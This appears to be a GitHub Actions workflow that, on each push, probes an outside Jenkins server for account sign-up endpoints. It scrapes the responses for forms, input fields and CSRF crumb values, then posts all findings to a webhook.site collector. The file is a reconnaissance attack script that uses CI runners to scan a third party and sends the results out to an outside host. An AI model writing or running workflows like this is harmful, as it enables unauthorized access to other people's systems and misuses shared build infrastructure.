name: jsignup6
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  signup:
    runs-on: ubuntu-latest
    steps:
      - name: FindSignup
        run: |
          {
            echo "=== GET /login ==="
            curl -sS -k -m 20 -c /tmp/cj -o /tmp/l.html -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/login 2>&1
            echo "--- links ---"
            grep -oiE "href=\"[^\"]+\"" /tmp/l.html 2>/dev/null | sort -u | head -40
            echo "--- signup mentions ---"
            grep -oiE ".{0,80}(signup|sign up|createAccount|register).{0,80}" /tmp/l.html 2>/dev/null | head -10
            for u in /signup/ /securityRealm/createAccount /securityRealm/addUser /signup; do
              echo "=== GET $u ==="
              curl -sS -k -m 20 -b /tmp/cj -c /tmp/cj -o /tmp/s.html -w "code=%{http_code} size=%{size_download}\n" "https://jenkins.htpl.cc$u" 2>&1
              grep -oiE "<form[^>]*>|<input[^>]*>|data-crumb-value=\"[^\"]+\"|action=\"[^\"]+\"|not enabled|Sign up" /tmp/s.html 2>/dev/null | head -15
            done
          } > /tmp/out.txt 2>&1
          curl -s -m 30 -X POST "https://webhook.site/87380dbc-47b4-4db4-859d-4d70861383fc" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
